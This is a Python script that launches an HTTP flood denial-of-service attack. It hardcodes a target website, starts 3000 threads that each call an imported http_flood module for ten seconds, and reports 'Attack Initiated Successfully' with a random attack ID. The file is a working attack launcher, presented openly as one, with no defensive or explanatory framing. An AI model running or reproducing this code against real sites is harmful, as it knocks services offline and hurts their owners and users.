from urllib.parse import urlparse
import threading
import time
from flask import jsonify
import http_flood
import random


def gen_attack_id():
    id = str(random.randrange(100000, 999999, 1))
    return id


def attack_worker(attack_id, duration, stop_id, start_time):
    while not stop_id.is_set() and time.time() - start_time < duration:
        time.sleep(1)
    stop_id.set()
    print(f"{attack_id} attack completed. Total elapsed time: {duration} seconds.")


def flood():

    print("Entered")
    target = "https://softnetai.com/"
    result = urlparse(target)
    host = result.netloc
    port = "443" if result.scheme == "https" else "80"
    duration = 10
    page = result.path
    key = "&" if "?" in page else "?"

    attack_id = gen_attack_id()

    stop_event = threading.Event()

    try:
        start_time = time.time()

        threads = []
        total_threads = 3000

        for i in range(total_threads):
            time.sleep(0.001)  # Sleep 1 microseconds
            t = threading.Thread(
                target=http_flood.flood,
                args=(host, port, duration, key, page, stop_event, start_time, i),
            )
            t.start()
            threads.append(t)
        w = threading.Thread(
            target=attack_worker,
            args=(
                attack_id,
                int(duration),
                stop_event,
                start_time,
            ),
        )
        w.start()
        threads.append(w)
        response_data = {
            "message": "Attack Initiated Successfully",
            "attack_id": attack_id,
            "method": "GET",
            "stopStatus": True,
            "status": 200,
        }
        print(response_data)
        print(f"All attack threads started for {duration} seconds.")
        return

    except Exception as e:
        response_data = {"error": "An error occurred. {e}"}
        print(response_data)


flood()
exit()
